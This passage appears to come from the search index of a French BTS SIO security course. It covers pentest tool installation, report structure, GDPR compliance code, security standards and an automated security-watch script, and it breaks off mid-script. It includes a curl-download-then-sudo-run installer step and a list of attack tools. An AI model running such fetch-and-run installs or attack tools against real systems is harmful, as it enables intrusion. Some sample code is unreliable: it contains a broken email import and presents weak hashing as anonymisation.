+x burpsuite.sh\nsudo ./burpsuite.sh\n\n# Installation d'OWASP ZAP\nsudo apt install -y zaproxy\n\n# Installation de Metasploit\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall\nchmod 755 msfinstall\nsudo ./msfinstall\n\n# Outils Python\npip3 install requests beautifulsoup4 python-nmap\n\n# Configuration de Burp Suite\necho \"[+] Configuration de Burp Suite...\"\nmkdir -p ~/.java/.userPrefs/burp\ncat &gt; ~/.java/.userPrefs/burp/prefs.xml &lt;&lt; 'EOF'\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE preferences SYSTEM \"http://java.sun.com/dtd/preferences.dtd\"&gt;\n&lt;preferences EXTERNAL_XML_VERSION=\"1.0\"&gt;\n  &lt;root type=\"user\"&gt;\n    &lt;map&gt;\n      &lt;entry key=\"burp.proxy.listener.port\" value=\"8080\"/&gt;\n      &lt;entry key=\"burp.proxy.listener.interface\" value=\"127.0.0.1\"/&gt;\n    &lt;/map&gt;\n  &lt;/root&gt;\n&lt;/preferences&gt;\nEOF\n\necho \"[+] Installation termin\u00e9e!\"\necho \"Outils install\u00e9s:\"\necho \"- Nmap (scan de ports)\"\necho \"- Nikto (scan web)\"\necho \"- Dirb/Gobuster (d\u00e9couverte de r\u00e9pertoires)\"\necho \"- Hydra (brute force)\"\necho \"- SQLMap (injection SQL)\"\necho \"- Burp Suite (proxy/scanner web)\"\necho \"- OWASP ZAP (scanner web)\"\necho \"- Metasploit (framework d'exploitation)\"\n</code></pre> Structure d'un rapport de test de p\u00e9n\u00e9tration Sections principales du rapport <ol> <li>R\u00e9sum\u00e9 ex\u00e9cutif : Synth\u00e8se pour la direction</li> <li>M\u00e9thodologie : Approche et outils utilis\u00e9s</li> <li>R\u00e9sultats : Vuln\u00e9rabilit\u00e9s par ordre de criticit\u00e9</li> <li>Recommandations : Mesures correctives prioritaires</li> <li>Annexes : D\u00e9tails techniques et preuves</li> </ol>   ### Classification des risques   S\u00e9v\u00e9rit\u00e9 Score CVSS Impact D\u00e9lai de correction Critique 9.0 - 10.0 Compromission totale du syst\u00e8me Imm\u00e9diat (24h) \u00c9lev\u00e9 7.0 - 8.9 Acc\u00e8s non autoris\u00e9 aux donn\u00e9es 1 semaine Moyen 4.0 - 6.9 Exposition d'informations 1 mois Faible 0.1 - 3.9 Impact limit\u00e9 3 mois  \ud83d\udca1 Bonnes pratiques pour les rapports : <ul> <li>Preuves visuelles : Captures d'\u00e9cran annot\u00e9es</li> <li>Reproductibilit\u00e9 : Steps d\u00e9taill\u00e9s pour reproduire</li> <li>Impact m\u00e9tier : Cons\u00e9quences concr\u00e8tes</li> <li>Solutions pratiques : Recommandations applicables</li> <li>Timeline : Priorit\u00e9s et d\u00e9lais de correction</li> </ul>"},{"location":"BTS/B2/B3_5_Outils_methodologies_securite/#pour-aller-plus-loin","title":"\ud83d\udcda Pour aller plus loin","text":"\ud83d\udd17 Ressources compl\u00e9mentaires : <ul> <li>OWASP.org : Documentation et outils officiels</li> <li>PortSwigger Web Security Academy : Formation Burp Suite</li> <li>VulnHub : Machines virtuelles vuln\u00e9rables pour s'entra\u00eener</li> <li>HackTheBox : Plateforme d'entra\u00eenement au pentest</li> <li>PTES (Penetration Testing Execution Standard) : M\u00e9thodologie standardis\u00e9e</li> </ul>"},{"location":"BTS/B2/B3_5_Outils_methodologies_securite/#points-cles-a-retenir","title":"\u2705 Points cl\u00e9s \u00e0 retenir","text":"<ol> <li>OWASP : R\u00e9f\u00e9rence incontournable pour la s\u00e9curit\u00e9 web</li> <li>Burp Suite : Outil professionnel pour les tests d'applications web</li> <li>M\u00e9thodologie : Approche structur\u00e9e et document\u00e9e</li> <li>Automatisation : Combiner outils automatiques et tests manuels</li> <li>Documentation : Rapport d\u00e9taill\u00e9 avec preuves et recommandations</li> </ol>  \ud83c\udf93 Prochaine \u00e9tape : Dans le cours B3.6, nous aborderons la conformit\u00e9 r\u00e9glementaire et la veille s\u00e9curit\u00e9 (RGPD, normes, identit\u00e9 num\u00e9rique)."},{"location":"BTS/B2/B3_6_Conformite_veille_securite/","title":"B3 6 Conformite veille securite","text":"B3.6 - Conformit\u00e9 et Veille S\u00e9curit\u00e9 <p>RGPD, Normes et Identit\u00e9 Num\u00e9rique - BTS SIO</p>"},{"location":"BTS/B2/B3_6_Conformite_veille_securite/#objectifs-du-cours","title":"\ud83c\udfaf Objectifs du cours\ud83d\udee1\ufe0f RGPD - R\u00e8glement G\u00e9n\u00e9ral sur la Protection des Donn\u00e9es\ud83d\udccb Normes et Standards de S\u00e9curit\u00e9\ud83d\udd0d Veille S\u00e9curit\u00e9\ud83c\udd94 Identit\u00e9 Num\u00e9rique et R\u00e9putation","text":"<p>\u00c0 l'issue de ce cours, vous serez capable de : - Appliquer les exigences du RGPD dans un contexte informatique - Comprendre les principales normes de s\u00e9curit\u00e9 (ISO 27001, ANSSI) - Mettre en place une strat\u00e9gie de veille s\u00e9curit\u00e9 - Pr\u00e9server et g\u00e9rer l'identit\u00e9 num\u00e9rique d'une organisation</p> RGPD (GDPR)  R\u00e8glement europ\u00e9en entr\u00e9 en vigueur le 25 mai 2018, qui encadre le traitement des donn\u00e9es personnelles sur le territoire de l'Union europ\u00e9enne. Il vise \u00e0 redonner aux citoyens le contr\u00f4le de leurs donn\u00e9es personnelles.  Principes fondamentaux du RGPD \ud83c\udfaf Finalit\u00e9  Les donn\u00e9es doivent \u00eatre collect\u00e9es pour des finalit\u00e9s d\u00e9termin\u00e9es, explicites et l\u00e9gitimes. Pas de traitement ult\u00e9rieur incompatible.  \ud83d\udccf Proportionnalit\u00e9  Les donn\u00e9es collect\u00e9es doivent \u00eatre ad\u00e9quates, pertinentes et limit\u00e9es \u00e0 ce qui est n\u00e9cessaire au regard des finalit\u00e9s.  \u23f0 Conservation limit\u00e9e  Les donn\u00e9es ne peuvent \u00eatre conserv\u00e9es que pendant la dur\u00e9e n\u00e9cessaire aux finalit\u00e9s pour lesquelles elles sont trait\u00e9es.  \ud83d\udd12 S\u00e9curit\u00e9  Mise en place de mesures techniques et organisationnelles appropri\u00e9es pour assurer la s\u00e9curit\u00e9 des donn\u00e9es.  \u2705 Exactitude  Les donn\u00e9es doivent \u00eatre exactes et, si n\u00e9cessaire, tenues \u00e0 jour. Toute mesure raisonnable doit \u00eatre prise pour effacer ou rectifier.  \ud83d\udc41\ufe0f Transparence  Information claire et compr\u00e9hensible des personnes concern\u00e9es sur le traitement de leurs donn\u00e9es personnelles.  Droits des personnes concern\u00e9es Les 8 droits fondamentaux <ol> <li>Droit \u00e0 l'information : \u00catre inform\u00e9 de la collecte et du traitement</li> <li>Droit d'acc\u00e8s : Obtenir une copie des donn\u00e9es personnelles</li> <li>Droit de rectification : Corriger les donn\u00e9es inexactes</li> <li>Droit \u00e0 l'effacement : \"Droit \u00e0 l'oubli\" sous certaines conditions</li> <li>Droit \u00e0 la limitation : Restreindre le traitement</li> <li>Droit \u00e0 la portabilit\u00e9 : R\u00e9cup\u00e9rer ses donn\u00e9es dans un format structur\u00e9</li> <li>Droit d'opposition : S'opposer au traitement pour des raisons l\u00e9gitimes</li> <li>Droits relatifs \u00e0 la prise de d\u00e9cision automatis\u00e9e : Ne pas subir de d\u00e9cision bas\u00e9e uniquement sur un traitement automatis\u00e9</li> </ol> Obligations des responsables de traitement Obligation Description Mise en \u0153uvre technique Registre des traitements Documenter tous les traitements de donn\u00e9es Base de donn\u00e9es des traitements, cartographie des flux Privacy by Design Int\u00e9grer la protection d\u00e8s la conception Chiffrement, pseudonymisation, minimisation Analyse d'impact (PIA) \u00c9valuer les risques pour les droits et libert\u00e9s M\u00e9thodologie CNIL, outils d'\u00e9valuation Notification de violation Signaler les incidents dans les 72h Proc\u00e9dures d'incident, outils de notification D\u00e9signation d'un DPO D\u00e9l\u00e9gu\u00e9 \u00e0 la protection des donn\u00e9es Formation, outils de gestion de la conformit\u00e9 Sanctions et amendes Sanctions administratives <ul> <li>Niveau 1 : Jusqu'\u00e0 10 millions d'euros ou 2% du CA annuel mondial</li> <li>Niveau 2 : Jusqu'\u00e0 20 millions d'euros ou 4% du CA annuel mondial</li> <li>Autres sanctions : Avertissement, mise en demeure, limitation temporaire ou d\u00e9finitive du traitement, suspension des flux de donn\u00e9es</li> </ul> Mise en conformit\u00e9 technique Exemple d'impl\u00e9mentation RGPD en Python <pre><code>#!/usr/bin/env python3\n\"\"\"\nSyst\u00e8me de gestion de la conformit\u00e9 RGPD\nExemple d'impl\u00e9mentation des droits des utilisateurs\n\"\"\"\n\nimport hashlib\nimport json\nimport datetime\nfrom typing import Dict, List, Optional\nfrom dataclasses import dataclass, asdict\nfrom enum import Enum\n\nclass ConsentType(Enum):\n    EXPLICIT = \"explicit\"\n    IMPLICIT = \"implicit\"\n    WITHDRAWN = \"withdrawn\"\n\nclass LegalBasis(Enum):\n    CONSENT = \"consent\"\n    CONTRACT = \"contract\"\n    LEGAL_OBLIGATION = \"legal_obligation\"\n    VITAL_INTERESTS = \"vital_interests\"\n    PUBLIC_TASK = \"public_task\"\n    LEGITIMATE_INTERESTS = \"legitimate_interests\"\n\n@dataclass\nclass PersonalData:\n    \"\"\"Repr\u00e9sentation d'une donn\u00e9e personnelle\"\"\"\n    field_name: str\n    value: str\n    category: str  # identit\u00e9, contact, professionnel, etc.\n    sensitivity: str  # normal, sensible, tr\u00e8s_sensible\n    source: str\n    collection_date: datetime.datetime\n    retention_period: int  # en jours\n    legal_basis: LegalBasis\n\n    def is_expired(self) -&gt; bool:\n        \"\"\"V\u00e9rifier si la donn\u00e9e a d\u00e9pass\u00e9 sa dur\u00e9e de conservation\"\"\"\n        expiry_date = self.collection_date + datetime.timedelta(days=self.retention_period)\n        return datetime.datetime.now() &gt; expiry_date\n\n    def anonymize(self) -&gt; str:\n        \"\"\"Anonymiser la donn\u00e9e\"\"\"\n        return hashlib.sha256(self.value.encode()).hexdigest()[:8]\n\n@dataclass\nclass DataSubject:\n    \"\"\"Personne concern\u00e9e par le traitement\"\"\"\n    subject_id: str\n    email: str\n    consents: Dict[str, ConsentType]\n    personal_data: List[PersonalData]\n    created_at: datetime.datetime\n    last_updated: datetime.datetime\n\n    def grant_consent(self, purpose: str, consent_type: ConsentType = ConsentType.EXPLICIT):\n        \"\"\"Accorder un consentement\"\"\"\n        self.consents[purpose] = consent_type\n        self.last_updated = datetime.datetime.now()\n\n    def withdraw_consent(self, purpose: str):\n        \"\"\"Retirer un consentement\"\"\"\n        self.consents[purpose] = ConsentType.WITHDRAWN\n        self.last_updated = datetime.datetime.now()\n\n    def has_valid_consent(self, purpose: str) -&gt; bool:\n        \"\"\"V\u00e9rifier si le consentement est valide\"\"\"\n        return self.consents.get(purpose) == ConsentType.EXPLICIT\n\nclass GDPRCompliance:\n    \"\"\"Syst\u00e8me de gestion de la conformit\u00e9 RGPD\"\"\"\n\n    def __init__(self):\n        self.data_subjects: Dict[str, DataSubject] = {}\n        self.processing_activities: List[Dict] = []\n        self.data_breaches: List[Dict] = []\n\n    def register_data_subject(self, subject_id: str, email: str) -&gt; DataSubject:\n        \"\"\"Enregistrer une nouvelle personne concern\u00e9e\"\"\"\n        subject = DataSubject(\n            subject_id=subject_id,\n            email=email,\n            consents={},\n            personal_data=[],\n            created_at=datetime.datetime.now(),\n            last_updated=datetime.datetime.now()\n        )\n        self.data_subjects[subject_id] = subject\n        return subject\n\n    def collect_personal_data(self, subject_id: str, data: PersonalData) -&gt; bool:\n        \"\"\"Collecter une donn\u00e9e personnelle\"\"\"\n        if subject_id not in self.data_subjects:\n            return False\n\n        subject = self.data_subjects[subject_id]\n\n        # V\u00e9rifier la base l\u00e9gale\n        if data.legal_basis == LegalBasis.CONSENT:\n            if not subject.has_valid_consent(\"data_collection\"):\n                return False\n\n        subject.personal_data.append(data)\n        subject.last_updated = datetime.datetime.now()\n        return True\n\n    def exercise_right_of_access(self, subject_id: str) -&gt; Optional[Dict]:\n        \"\"\"Droit d'acc\u00e8s - Fournir toutes les donn\u00e9es de la personne\"\"\"\n        if subject_id not in self.data_subjects:\n            return None\n\n        subject = self.data_subjects[subject_id]\n\n        return {\n            \"subject_id\": subject.subject_id,\n            \"email\": subject.email,\n            \"consents\": subject.consents,\n            \"personal_data\": [asdict(data) for data in subject.personal_data],\n            \"created_at\": subject.created_at.isoformat(),\n            \"last_updated\": subject.last_updated.isoformat()\n        }\n\n    def exercise_right_of_rectification(self, subject_id: str, field_name: str, new_value: str) -&gt; bool:\n        \"\"\"Droit de rectification - Corriger une donn\u00e9e\"\"\"\n        if subject_id not in self.data_subjects:\n            return False\n\n        subject = self.data_subjects[subject_id]\n\n        for data in subject.personal_data:\n            if data.field_name == field_name:\n                data.value = new_value\n                subject.last_updated = datetime.datetime.now()\n                return True\n\n        return False\n\n    def exercise_right_of_erasure(self, subject_id: str, field_name: Optional[str] = None) -&gt; bool:\n        \"\"\"Droit \u00e0 l'effacement - Supprimer des donn\u00e9es\"\"\"\n        if subject_id not in self.data_subjects:\n            return False\n\n        subject = self.data_subjects[subject_id]\n\n        if field_name:\n            # Supprimer une donn\u00e9e sp\u00e9cifique\n            subject.personal_data = [\n                data for data in subject.personal_data \n                if data.field_name != field_name\n            ]\n        else:\n            # Supprimer toutes les donn\u00e9es\n            del self.data_subjects[subject_id]\n\n        return True\n\n    def exercise_right_of_portability(self, subject_id: str) -&gt; Optional[str]:\n        \"\"\"Droit \u00e0 la portabilit\u00e9 - Export des donn\u00e9es en JSON\"\"\"\n        data = self.exercise_right_of_access(subject_id)\n        if data:\n            return json.dumps(data, indent=2, ensure_ascii=False)\n        return None\n\n    def data_retention_cleanup(self):\n        \"\"\"Nettoyage automatique des donn\u00e9es expir\u00e9es\"\"\"\n        cleaned_count = 0\n\n        for subject in self.data_subjects.values():\n            original_count = len(subject.personal_data)\n            subject.personal_data = [\n                data for data in subject.personal_data \n                if not data.is_expired()\n            ]\n            cleaned_count += original_count - len(subject.personal_data)\n\n        return cleaned_count\n\n    def report_data_breach(self, description: str, affected_subjects: List[str], \n                          severity: str, measures_taken: str):\n        \"\"\"Signaler une violation de donn\u00e9es\"\"\"\n        breach = {\n            \"id\": hashlib.md5(f\"{datetime.datetime.now()}{description}\".encode()).hexdigest(),\n            \"description\": description,\n            \"affected_subjects\": affected_subjects,\n            \"severity\": severity,\n            \"measures_taken\": measures_taken,\n            \"reported_at\": datetime.datetime.now().isoformat(),\n            \"notified_to_authority\": False,\n            \"subjects_notified\": False\n        }\n\n        self.data_breaches.append(breach)\n\n        # Notification automatique si plus de 72h\n        if severity in [\"high\", \"critical\"]:\n            breach[\"requires_immediate_notification\"] = True\n\n        return breach[\"id\"]\n\n    def generate_compliance_report(self) -&gt; Dict:\n        \"\"\"G\u00e9n\u00e9rer un rapport de conformit\u00e9\"\"\"\n        total_subjects = len(self.data_subjects)\n        total_data_points = sum(len(s.personal_data) for s in self.data_subjects.values())\n\n        consent_stats = {}\n        for subject in self.data_subjects.values():\n            for purpose, consent in subject.consents.items():\n                if purpose not in consent_stats:\n                    consent_stats[purpose] = {\"explicit\": 0, \"withdrawn\": 0}\n                if consent == ConsentType.EXPLICIT:\n                    consent_stats[purpose][\"explicit\"] += 1\n                elif consent == ConsentType.WITHDRAWN:\n                    consent_stats[purpose][\"withdrawn\"] += 1\n\n        return {\n            \"report_date\": datetime.datetime.now().isoformat(),\n            \"total_data_subjects\": total_subjects,\n            \"total_data_points\": total_data_points,\n            \"consent_statistics\": consent_stats,\n            \"data_breaches_count\": len(self.data_breaches),\n            \"compliance_score\": self._calculate_compliance_score()\n        }\n\n    def _calculate_compliance_score(self) -&gt; float:\n        \"\"\"Calculer un score de conformit\u00e9 basique\"\"\"\n        if not self.data_subjects:\n            return 100.0\n\n        total_score = 0\n        total_subjects = len(self.data_subjects)\n\n        for subject in self.data_subjects.values():\n            subject_score = 0\n\n            # Points pour les consentements explicites\n            explicit_consents = sum(1 for c in subject.consents.values() \n                                  if c == ConsentType.EXPLICIT)\n            if explicit_consents &gt; 0:\n                subject_score += 30\n\n            # Points pour la fra\u00eecheur des donn\u00e9es\n            days_since_update = (datetime.datetime.now() - subject.last_updated).days\n            if days_since_update &lt; 30:\n                subject_score += 20\n\n            # Points pour la limitation des donn\u00e9es\n            if len(subject.personal_data) &lt; 10:  # Principe de minimisation\n                subject_score += 25\n\n            # Points pour l'absence de donn\u00e9es expir\u00e9es\n            expired_data = sum(1 for data in subject.personal_data if data.is_expired())\n            if expired_data == 0:\n                subject_score += 25\n\n            total_score += subject_score\n\n        return min(100.0, total_score / total_subjects)\n\n# Exemple d'utilisation\nif __name__ == \"__main__\":\n    # Initialisation du syst\u00e8me RGPD\n    gdpr_system = GDPRCompliance()\n\n    # Enregistrement d'un utilisateur\n    user = gdpr_system.register_data_subject(\"user123\", \"user@example.com\")\n    user.grant_consent(\"data_collection\", ConsentType.EXPLICIT)\n    user.grant_consent(\"marketing\", ConsentType.EXPLICIT)\n\n    # Collecte de donn\u00e9es personnelles\n    personal_data = PersonalData(\n        field_name=\"nom\",\n        value=\"Dupont\",\n        category=\"identit\u00e9\",\n        sensitivity=\"normal\",\n        source=\"formulaire_inscription\",\n        collection_date=datetime.datetime.now(),\n        retention_period=365,  # 1 an\n        legal_basis=LegalBasis.CONSENT\n    )\n\n    gdpr_system.collect_personal_data(\"user123\", personal_data)\n\n    # Exercice des droits\n    print(\"=== Droit d'acc\u00e8s ===\")\n    access_data = gdpr_system.exercise_right_of_access(\"user123\")\n    print(json.dumps(access_data, indent=2, ensure_ascii=False))\n\n    print(\"\\n=== Droit de portabilit\u00e9 ===\")\n    portable_data = gdpr_system.exercise_right_of_portability(\"user123\")\n    print(portable_data)\n\n    print(\"\\n=== Rapport de conformit\u00e9 ===\")\n    compliance_report = gdpr_system.generate_compliance_report()\n    print(json.dumps(compliance_report, indent=2, ensure_ascii=False))\n</code></pre> Normes de s\u00e9curit\u00e9  R\u00e9f\u00e9rentiels internationaux qui d\u00e9finissent les bonnes pratiques et exigences pour la mise en place d'un syst\u00e8me de management de la s\u00e9curit\u00e9 de l'information efficace.  Principales normes de s\u00e9curit\u00e9 \ud83c\udfc6 ISO 27001 <p>Syst\u00e8me de Management de la S\u00e9curit\u00e9 de l'Information (SMSI)</p> <ul> <li>Approche par les risques</li> <li>Am\u00e9lioration continue (PDCA)</li> <li>114 mesures de s\u00e9curit\u00e9</li> <li>Certification possible</li> </ul> \ud83c\uddeb\ud83c\uddf7 ANSSI <p>Agence Nationale de la S\u00e9curit\u00e9 des Syst\u00e8mes d'Information</p> <ul> <li>Guide d'hygi\u00e8ne informatique</li> <li>R\u00e9f\u00e9rentiel g\u00e9n\u00e9ral de s\u00e9curit\u00e9 (RGS)</li> <li>Crit\u00e8res communs (CC)</li> <li>Certification CSPN</li> </ul> \ud83c\udfed IEC 62443 <p>S\u00e9curit\u00e9 des syst\u00e8mes industriels</p> <ul> <li>Syst\u00e8mes de contr\u00f4le industriel</li> <li>Zones et conduits de s\u00e9curit\u00e9</li> <li>Niveaux de s\u00e9curit\u00e9 (SL)</li> <li>Cybers\u00e9curit\u00e9 OT</li> </ul> \ud83d\udcb3 PCI DSS <p>Payment Card Industry Data Security Standard</p> <ul> <li>Protection des donn\u00e9es de cartes</li> <li>12 exigences principales</li> <li>Tests de p\u00e9n\u00e9tration obligatoires</li> <li>Audit annuel</li> </ul> \ud83c\udfe5 HDS <p>H\u00e9bergement de Donn\u00e9es de Sant\u00e9</p> <ul> <li>Donn\u00e9es de sant\u00e9 \u00e0 caract\u00e8re personnel</li> <li>Certification obligatoire</li> <li>Tra\u00e7abilit\u00e9 et chiffrement</li> <li>Proc\u00e9dures d'urgence</li> </ul> \ud83c\udf10 NIST <p>National Institute of Standards and Technology</p> <ul> <li>Cybersecurity Framework</li> <li>5 fonctions principales</li> <li>Identify, Protect, Detect, Respond, Recover</li> <li>Approche par maturit\u00e9</li> </ul> ISO 27001 - D\u00e9tail des domaines Domaine Objectifs Mesures cl\u00e9s A.5 - Politiques de s\u00e9curit\u00e9 Orientation et soutien de la direction Politique de s\u00e9curit\u00e9, revue r\u00e9guli\u00e8re A.6 - Organisation Cadre de gouvernance de la s\u00e9curit\u00e9 R\u00f4les et responsabilit\u00e9s, accords de confidentialit\u00e9 A.7 - S\u00e9curit\u00e9 RH Personnel de confiance et sensibilis\u00e9 V\u00e9rification des ant\u00e9c\u00e9dents, formation A.8 - Gestion des actifs Protection appropri\u00e9e des actifs Inventaire, classification, manipulation A.9 - Contr\u00f4le d'acc\u00e8s Acc\u00e8s autoris\u00e9 uniquement Politique d'acc\u00e8s, gestion des privil\u00e8ges A.10 - Cryptographie Usage appropri\u00e9 de la cryptographie Politique cryptographique, gestion des cl\u00e9s A.11 - S\u00e9curit\u00e9 physique Protection des zones et \u00e9quipements P\u00e9rim\u00e8tres s\u00e9curis\u00e9s, protection contre les menaces A.12 - S\u00e9curit\u00e9 d'exploitation Fonctionnement s\u00e9curis\u00e9 des syst\u00e8mes Proc\u00e9dures d'exploitation, gestion des vuln\u00e9rabilit\u00e9s A.13 - S\u00e9curit\u00e9 des communications Protection des informations en transit Gestion du r\u00e9seau, transferts s\u00e9curis\u00e9s A.14 - D\u00e9veloppement s\u00e9curis\u00e9 S\u00e9curit\u00e9 int\u00e9gr\u00e9e dans le cycle de vie Politique de d\u00e9veloppement, tests de s\u00e9curit\u00e9 A.15 - Relations fournisseurs Protection dans les relations tierces Politique fournisseurs, accords de service A.16 - Gestion des incidents R\u00e9ponse coh\u00e9rente et efficace Proc\u00e9dures d'incident, am\u00e9lioration continue A.17 - Continuit\u00e9 d'activit\u00e9 Maintien des op\u00e9rations critiques Plan de continuit\u00e9, tests r\u00e9guliers A.18 - Conformit\u00e9 Respect des exigences l\u00e9gales Identification des exigences, audits Checklist de mise en conformit\u00e9 ISO 27001 \u2705 Phase 1 : Pr\u00e9paration <ul> <li>D\u00e9finir le p\u00e9rim\u00e8tre du SMSI</li> <li>Identifier les parties int\u00e9ress\u00e9es</li> <li>\u00c9tablir la politique de s\u00e9curit\u00e9</li> <li>Nommer un responsable SMSI</li> </ul> \u2705 Phase 2 : Analyse des risques <ul> <li>Inventaire des actifs informationnels</li> <li>Identification des menaces et vuln\u00e9rabilit\u00e9s</li> <li>\u00c9valuation des risques (probabilit\u00e9 \u00d7 impact)</li> <li>D\u00e9finition du niveau de risque acceptable</li> </ul> \u2705 Phase 3 : Traitement des risques <ul> <li>S\u00e9lection des mesures de s\u00e9curit\u00e9</li> <li>D\u00e9claration d'applicabilit\u00e9 (SoA)</li> <li>Plan de traitement des risques</li> <li>Validation par la direction</li> </ul> \u2705 Phase 4 : Mise en \u0153uvre <ul> <li>D\u00e9ploiement des mesures techniques</li> <li>Formation et sensibilisation</li> <li>Documentation des proc\u00e9dures</li> <li>Tests et validation</li> </ul> \u2705 Phase 5 : Surveillance <ul> <li>Indicateurs de performance (KPI)</li> <li>Audits internes r\u00e9guliers</li> <li>Revue de direction</li> <li>Am\u00e9lioration continue</li> </ul> Veille s\u00e9curit\u00e9  Processus continu de collecte, d'analyse et de diffusion d'informations sur les menaces, vuln\u00e9rabilit\u00e9s et \u00e9volutions technologiques en mati\u00e8re de cybers\u00e9curit\u00e9.  Sources de veille s\u00e9curit\u00e9 \ud83c\udfdb\ufe0f Sources institutionnelles <ul> <li>ANSSI : Bulletins d'alerte, guides de bonnes pratiques</li> <li>CERT-FR : Alertes de s\u00e9curit\u00e9, avis de vuln\u00e9rabilit\u00e9s</li> <li>CISA : Cybersecurity advisories (\u00c9tats-Unis)</li> <li>ENISA : Rapports sur les menaces (Europe)</li> </ul> \ud83d\udd0d Bases de vuln\u00e9rabilit\u00e9s <ul> <li>CVE (Common Vulnerabilities and Exposures) : Base internationale</li> <li>NVD (National Vulnerability Database) : NIST</li> <li>VulnDB : Base commerciale d\u00e9taill\u00e9e</li> <li>Exploit-DB : Exploits publics</li> </ul> \ud83c\udf10 Communaut\u00e9s et forums <ul> <li>Reddit : r/netsec, r/cybersecurity</li> <li>Twitter : Comptes d'experts en s\u00e9curit\u00e9</li> <li>Discord/Slack : Communaut\u00e9s sp\u00e9cialis\u00e9es</li> <li>Conf\u00e9rences : BlackHat, DefCon, SSTIC</li> </ul> \ud83c\udfe2 Sources commerciales <ul> <li>Threat Intelligence : FireEye, CrowdStrike</li> <li>Rapports sectoriels : Verizon DBIR, IBM X-Force</li> <li>\u00c9diteurs de s\u00e9curit\u00e9 : Bulletins produits</li> <li>Cabinets de conseil : Analyses prospectives</li> </ul> Automatisation de la veille Syst\u00e8me automatis\u00e9 de veille s\u00e9curit\u00e9 <pre><code>#!/usr/bin/env python3\n\"\"\"\nSyst\u00e8me automatis\u00e9 de veille s\u00e9curit\u00e9\nCollecte et analyse des informations de s\u00e9curit\u00e9\n\"\"\"\n\nimport requests\nimport feedparser\nimport json\nimport re\nimport time\nfrom datetime import datetime, timedelta\nfrom typing import List, Dict, Optional\nimport sqlite3\nfrom dataclasses import dataclass\nimport smtplib\nfrom email.mime.text import MimeText\nfrom email.mime.multipart import MimeMultipart\n\n@dataclass\nclass SecurityAlert:\n    \"\"\"Alerte de s\u00e9curit\u00e9\"\"\"\n    id: str\n    title: str\n    description: str\n    severity: str\n    source: str\n    published_date: datetime\n    cve_ids: List[str]\n    affected_products: List[str]\n    url: str\n    tags: List[str]\n\nclass SecurityWatchdog:\n    \"\"\"Syst\u00e8me de veille s\u00e9curit\u00e9 automatis\u00e9\"\"\"\n\n    def __init__(self, db_path: str = \"security_watch.db\"):\n        self.db_path = db_path\n        self.init_database()\n\n        # Sources RSS/Atom\n        self.rss_feeds = {\n            \"CERT-FR\": \"https://www.cert.ssi.gouv.fr/feed/\",\n            \"US-CERT\": \"https://www.cisa.gov/cybersecurity-advisories/all.xml\",\n            \"NVD\": \"https://nvd.nist.gov/feeds/xml/cve/misc/nvd-rss.xml\",\n            \"SANS\": \"https://isc.sans.edu/rssfeed.xml\",\n            \"Krebs\": \"https://krebsonsecurity.com/feed/\",\n            \"Schneier\": \"https://www.schneier.com/feed/\"\n        }\n\n        # APIs de threat intelligence\n        self.apis = {\n            \"cve_details\": \"https://cve.circl.lu/api/\",\n            \"vulndb\": \"https://vulndb.cyberriskanalytics.com/api/v1/\",\n            \"mitre\": \"https://cve.mitre.org/cgi-bin/cvekey.cgi\"\n        }\n\n        # Mots-cl\u00e9s de surveillance\n        self.keywords = [\n            \"zero-day\", \"ransomware\", \"apt\", \"malware\",\n            \"data breach\", \"vulnerability\", \"exploit\",\n            \"phishing\", \"ddos\", \"botnet\"\n        ]\n\n        # Produits surveill\u00e9s\n        self.monitored_products = [\n            \"windows\", \"linux\", \"apache\", \"nginx\",\n            \"mysql\", \"postgresql\", \"php\", \"python\",\n            \"java\", \"javascript\", \"wordpress\", \"drupal\"\n        ]\n\n    def init_database(self):\n        \"\"\"Initialiser la base de donn\u00e9es SQLite\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        cursor.execute('''\n            CREATE TABLE IF NOT EXISTS alerts (\n                id TEXT PRIMARY KEY,\n                title TEXT NOT NULL,\n                description TEXT,\n                severity TEXT,\n                source TEXT,\n                published_date TEXT,\n                cve_ids TEXT,\n                affected_products TEXT,\n                url TEXT,\n                tags TEXT,\n                processed BOOLEAN DEFAULT FALSE,\n                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n            )\n        ''')\n\n        cursor.execute('''\n            CREATE TABLE IF NOT EXISTS keywords_tracking (\n                keyword TEXT,\n                alert_id TEXT,\n                matches INTEGER,\n                FOREIGN KEY (alert_id) REFERENCES alerts (id)\n            )\n        ''')\n\n        conn.commit()\n        conn.close()\n\n    def fetch_rss_feeds(self) -&gt; List[SecurityAlert]:\n        \"\"\"R\u00e9cup\u00e9rer les flux RSS/Atom\"\"\"\n        alerts = []\n\n        for source_name, feed_url in self.rss_feeds.items():\n            try:\n                print(f\"[+] R\u00e9cup\u00e9ration du flux {source_name}...\")\n                feed = feedparser.parse(feed_url)\n\n                for entry in feed.entries:\n                    # Extraire les CVE IDs\n                    cve_pattern = r'CVE-\\d{4}-\\d{4,7}'\n                    cve_ids = re.findall(cve_pattern, entry.title + \" \" + entry.get('summary', ''))\n\n                    # D\u00e9tecter les produits affect\u00e9s\n                    affected_products = []\n                    content = (entry.title + \" \" + entry.get('summary', '')).lower()\n                    for product in self.monitored_products:\n                        if product in content:\n                            affected_products.append(product)\n\n                    # Calculer la s\u00e9v\u00e9rit\u00e9 bas\u00e9e sur les mots-cl\u00e9s\n                    severity = self._calculate_severity(content, cve_ids)\n\n                    # Extraire les tags\n                    tags = self._extract_tags(content)\n\n                    alert = SecurityAlert(\n                        id=f\"{source_name}_{hash(entry.link)}\",\n                        title=entry.title,\n                        description=entry.get('summary', ''),\n                        severity=severity,\n                        source=source_name,\n                        published_date=datetime(*entry.published_parsed[:6]) if hasattr(entry, 'published_parsed') else datetime.now(),\n                        cve_ids=cve_ids,\n                        affected_products=affected_products,\n                        url=entry.link,\n                        tags=tags\n                    )\n\n                    alerts.append(alert)\n\n            except Exception as e:\n                print(f\"[-] Erreur lors de la r\u00e9cup\u00e9ration de {source_name}: {e}\")\n\n        return alerts\n\n    def fetch_cve_details(self, cve_id: str) -&gt; Optional[Dict]:\n        \"\"\"R\u00e9cup\u00e9rer les d\u00e9tails d'une CVE\"\"\"\n        try:\n            url = f\"https://cve.circl.lu/api/cve/{cve_id}\"\n            response = requests.get(url, timeout=10)\n\n            if response.status_code == 200:\n                return response.json()\n\n        except Exception as e:\n            print(f\"[-] Erreur lors de la 